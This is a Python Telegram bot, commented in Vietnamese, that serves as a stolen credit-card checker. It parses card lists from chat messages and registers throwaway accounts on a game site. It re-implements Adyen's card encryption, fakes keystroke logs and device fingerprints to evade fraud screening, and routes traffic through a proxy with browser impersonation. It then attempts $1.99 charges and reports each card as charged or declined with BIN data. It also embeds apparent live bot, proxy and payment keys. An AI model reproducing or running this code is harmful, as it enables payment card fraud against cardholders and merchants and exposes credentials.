import telebot
import re
import os
import json
import hmac
import hashlib
import base64
import time
import asyncio
import random
import string
from datetime import datetime
from fake_useragent import UserAgent
from colorama import Fore, init
from curl_cffi.requests import AsyncSession

# Khởi tạo colorama
init(autoreset=True)

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM & PROXY
# ===================================================================

# ĐIỀN TOKEN BOT CỦA BẠN VÀO ĐÂY
API_TOKEN = '8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0' 

bot = telebot.TeleBot(API_TOKEN)

# CẤU HÌNH PROXY
proxy_host = "aus.360s5.com"
proxy_port = "3600"
proxy_user = "88634867-zone-custom"
proxy_pass = "AetOKcLB"
proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

# Proxies config cho curl_cffi
proxies = {
    "http": proxy_url,
    "https" : proxy_url
}

# KEY CẤU HÌNH
ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
STRIPE_KEY = "live_4TWKSNW445CGJJGVPEWXKHDAGMMTXVQT" 
DOMAIN_URL = "https://taongafarm.com"

# Thư viện mã hóa
try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_OAEP, AES
    from Cryptodome.Util.Padding import pad
    from jose import jwk
except ImportError:
    print("Thiếu thư viện! Vui lòng chạy: pip install pycryptodomex python-jose curl-cffi pyTelegramBotAPI")
    exit()

# ===================================================================
# === CÁC HÀM XỬ LÝ CHUỖI & VALIDATE
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    match = re.search(pattern, card_str)
    
    if not match:
        return None
    
    card_num, month, year, cvv = match.groups()
    
    # Validate Month
    try:
        month_int = int(month)
        if month_int < 1 or month_int > 12: return None
    except ValueError: return None
    
    # Validate Year
    if len(year) == 2: year = '20' + year
    try:
        year_int = int(year)
        if year_int > 2040: return None 
    except ValueError: return None
    
    month = month.zfill(2)
    return f"{card_num}|{month}|{year}|{cvv}"

def extract_cards_from_text(text):
    if not text: return []
    valid_cards = []
    seen = set()
    lines = text.splitlines()
    pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    
    for line in lines:
        matches = re.findall(pattern_strict, line)
        for m in matches:
            temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
            normalized = normalize_card(temp_str)
            if normalized and normalized not in seen:
                valid_cards.append(normalized)
                seen.add(normalized)
    return valid_cards

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def generate_random_email():
    names = ["nguyenvan", "minhquan", "anhtuan", "quanghuy", "hoangnam", "thanhdat", "quocbao", "huyhoang", "vanthanh", "theanh", "ngocanh", "thuylinh", "kimngan", "minhthu", "lananh", "hoangyen", "myhanh", "cuongpro", "minhvip", "datcute", "huydz", "tuananh199"]
    name = random.choice(names)
    random_str = ''.join(random.choices(string.digits, k=5))
    return f"{name}{random_str}@gmail.com"

# ===================================================================
# === PHẦN: THUẬT TOÁN MÃ HÓA ADYEN (GIỮ NGUYÊN - SYNC)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(length):
    base_time = random.randint(2000, 5000)
    events = []
    events.append(f"fo@{base_time}")
    base_time += random.randint(50, 200)
    events.append(f"cl@{base_time}")
    base_time += random.randint(100, 300)
    for _ in range(length):
        base_time += random.randint(80, 250) 
        events.append(f"KN@{base_time}")
    base_time += random.randint(200, 500)
    events.append(f"ch@{base_time}")
    return {"log": ",".join(events), "key_count": str(length), "click_count": "1", "focus_count": "1"}

def w(e):
    t = e
    if isinstance(t, str): t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t): r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32
def mt(e, t, r):
    if not (0 <= t < bt): raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2: raise ValueError("Malformed public key")
        decoded_part1 = k(parts[0])
        decoded_part2 = k(parts[1])
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)
        self.key_object = {"kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP"}
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key, domain):
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.3/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    card_log_data = generate_fake_log(len(card_number))
    cvc_log_data = generate_fake_log(len(cvc))

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", 
            "activate": str(random.randint(3, 5)), "referrer": referrer, "numberFieldFocusCount": card_log_data['focus_count'], 
            "numberFieldLog": card_log_data['log'], "numberFieldClickCount": card_log_data['click_count'], "numberFieldKeyCount": card_log_data['key_count']
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": str(random.randint(2, 4)), 
            "referrer": referrer, "cvcFieldFocusCount": cvc_log_data['focus_count'], "cvcFieldLog": cvc_log_data['log'], 
            "cvcFieldClickCount": cvc_log_data['click_count'], "cvcFieldKeyCount": cvc_log_data['key_count'], "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "1", "deactivate": "1"
        }
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_dadus(user_agent):
    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user_agent}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
    return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')

# ===================================================================
# === ASYNC LOGIC XỬ LÝ (BIN & CHECKOUT)
# ===================================================================

async def get_bin_info(session, cc_num):
    """
    Lấy thông tin BIN từ bins.antipublic.cc sử dụng session curl_cffi
    """
    try:
        bin_code = cc_num[:6]
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        # Dùng session hiện tại (có proxy) để gọi, timeout 5s để không bị delay
        resp = await session.get(url, timeout=5)
        
        if resp.status_code == 200:
            data = resp.json()
            brand = data.get("brand", "N/A")
            country_name = data.get("country_name", "N/A")
            bank = data.get("bank", "N/A")
            level = data.get("level", "N/A")
            card_type = data.get("type", "N/A")
            return f"{brand} - {country_name} - {bank} - {level} - {card_type}"
        else:
            return "BIN N/A"
    except Exception:
        return "BIN ERROR"

async def process_card_async(cc, mm, yyyy, cvc, message_chat_id):
    MAX_RETRIES = 20
    user_agent = UserAgent().random
    
    # Sử dụng AsyncSession của curl_cffi để giả lập TLS (impersonate='chrome120')
    async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False) as session:
        
        # Gọi hàm check BIN song song (Task) để không chặn luồng chính
        bin_task = asyncio.create_task(get_bin_info(session, cc))
        
        # --- BƯỚC 1: LOOP ĐĂNG KÝ USER ---
        reg_success = False
        current_email = ""
        
        # Loop đăng ký (vô hạn cho đến khi được)
        while not reg_success:
            try:
                # Lấy Token
                reg_headers = {
                    'accept': '*/*', 'accept-language': 'vi-VN,vi;q=0.9',
                    'referer': 'https://taongafarm.com/en/',
                    'user-agent': user_agent
                }
                resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text) or re.search(r"window.csrftoken='([^']+)'", resp_token.text)
                
                if not match:
                    await asyncio.sleep(0.5)
                    continue 
                
                token = match.group(1)
                # curl_cffi tự quản cookie, nhưng set explicit nếu cần (thường session tự lưu)
                # Nhưng logic cũ set cookie '_csrf', ta làm theo
                session.cookies.set('_csrf', token, domain='taongafarm.com')
                
                # Register
                current_email = generate_random_email()
                reg_headers.update({
                    'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                    'x-csrf-token': token
                })
                reg_data = {
                    'email': current_email, 'password': 'Minhnhat@@123',
                    'register_info': {'device': {}, 'lang': 'en', 'nav': {'cookieEnabled': True, 'platform': 'Win32'}, 'ref': 'direct', 'url': '/en/'},
                    'skip_email_validation': False, 'user_agree_terms': True
                }
                
                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=15)
                
                # Check cookie login
                cookies_dict = session.cookies.get_dict()
                if 'session_portal' in cookies_dict:
                    reg_success = True
                else:
                    pass
            except Exception:
                await asyncio.sleep(0.5)
                pass

        # --- BƯỚC 2: THANH TOÁN (RETRY LOGIC) ---
        for attempt in range(1, MAX_RETRIES + 1):
            try:
                # Mã hóa (CPU bound - chạy sync)
                encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
                
                payment_headers = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://taongafarm.com',
                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
                    'user-agent': user_agent,
                }
                
                payment_json_data = {
                    'paymentRequest': {
                        'riskData': {'clientData': generate_dadus(user_agent)},
                        'paymentMethod': {
                            'type': 'scheme', 'holderName': '',
                            'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
                            'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
                            'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
                            'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
                            'brand': get_short_brand_name(cc),
                            'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
                        },
                        'storePaymentMethod': False,
                        'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': user_agent, 'timeZoneOffset': -420},
                        'origin': 'https://taongafarm.com', 'clientStateDataIndicator': True,
                    },
                    'checkoutRequest': {
                        'countryCodeFallback': 'GB', 'countryCodeOverride': '', 'email': current_email,
                        'gameLanguage': 'en', 'gameLocale': 'en_US', 'offerId': 38334, 'platformId': '70345744830530987221',
                        'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': 1.99, 'quantity': 1,
                    },
                    'browserInfo': {'acceptHeader': '*/*', 'screenWidth': 2048, 'screenHeight': 1152, 'colorDepth': 24, 'userAgent': user_agent, 'timeZoneOffset': -420, 'language': 'en-US', 'javaEnabled': False},
                    'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
                }
                
                response = await session.post(
                    'https://taongafarm.com/payment/adyen/api/checkout/payment',
                    headers=payment_headers, json=payment_json_data, timeout=20
                )
                
                try:
                    data = response.json()
                except:
                    continue # JSON Error -> Retry

                # Lấy các trường kết quả
                additionalData = data.get('additionalData', {})
                resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
                refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
                
                cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
                cvcResult = additionalData.get('cvcResult', 'N/A')
                avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
                avsResult = additionalData.get('avsResult', 'N/A')
                refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')

                # Đợi lấy bin info
                bin_info_str = await bin_task

                # Xử lý kết quả 3DS -> Retry (logic cũ)
                if resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
                    if attempt < MAX_RETRIES:
                        continue # Retry lại (Lưu ý: Logic cũ retry cả loop đăng ký, ở đây ta retry payment request hoặc có thể break để return 3DS)
                    else:
                        msg = "3DS LIMIT"
                        result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
                        return f"⚠️ <b>3DS LIMIT</b> | {result_str}"
                
                # Kết quả Live/Die
                if resultCode == "Authorised":
                    msg = "CHARGED 1.99$"
                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
                    return f"✅ <b>CHARGED</b> | {result_str}"
                
                elif resultCode == "Refused":
                    msg = f"Refused: {refusalReason}"
                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
                    return f"❌ <b>DECLINED</b> | {result_str}"
                
                else:
                    if attempt < MAX_RETRIES: continue
                    msg = f"Unknown: {resultCode}"
                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
                    return f"❌ <b>UNKNOWN</b> | {result_str}"

            except Exception as e:
                if attempt == MAX_RETRIES:
                    bin_info_str = await bin_task # Đảm bảo await nếu lỗi
                    return f"❌ <b>ERROR</b> | {cc}|{mm}|{yyyy}|{cvc} | {str(e)} - [{bin_info_str}]"
                continue

    bin_info_str = await bin_task
    return f"❌ <b>TIMEOUT</b> | {cc}|{mm}|{yyyy}|{cvc} | Timeout after {MAX_RETRIES} tries - [{bin_info_str}]"

# ===================================================================
# === TELEGRAM BOT HANDLER (SYNC WRAPPER -> ASYNC)
# ===================================================================

@bot.message_handler(commands=['st', 'start'])
def handle_check_cards(message):
    raw_text = message.text.replace('/st', '').replace('/start', '').strip()
    
    if not raw_text:
        if message.reply_to_message and message.reply_to_message.text:
            raw_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "⚠️ Vui lòng nhập list thẻ. Ví dụ: `/st 4000000000000000|12|24|123`", parse_mode="Markdown")
            return

    cards = extract_cards_from_text(raw_text)
    
    if not cards:
        bot.reply_to(message, "⚠️ Không tìm thấy thẻ hợp lệ.")
        return

    bot.reply_to(message, f"🚀 <b>Bắt đầu check {len(cards)} thẻ (Async Speed)...</b>", parse_mode="HTML")

    # Hàm chạy async loop trong thread sync của telebot
    async def run_checks():
        tasks = []
        # Semaphore để giới hạn số luồng (tránh crash hoặc lỗi proxy quá tải)
        sem = asyncio.Semaphore(5) # Check 5 thẻ cùng lúc

        async def worker(card):
            async with sem:
                cc, mm, yyyy, cvc = card.split('|')
                if not validate_luhn(cc):
                    bot.send_message(message.chat.id, f"🗑 <b>INVALID LUHN</b> | {cc}", parse_mode="HTML")
                    return
                
                # Check
                res = await process_card_async(cc, mm, yyyy, cvc, message.chat.id)
                bot.send_message(message.chat.id, res, parse_mode="HTML")

        for card in cards:
            tasks.append(asyncio.create_task(worker(card)))
        
        await asyncio.gather(*tasks)

    # Chạy asyncio loop
    try:
        asyncio.run(run_checks())
        bot.send_message(message.chat.id, "🏁 <b>Hoàn tất checking!</b>", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi hệ thống: {str(e)}")

# Chạy bot
if __name__ == "__main__":
    print("Bot is running with Curl_CFFI Async...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(3)
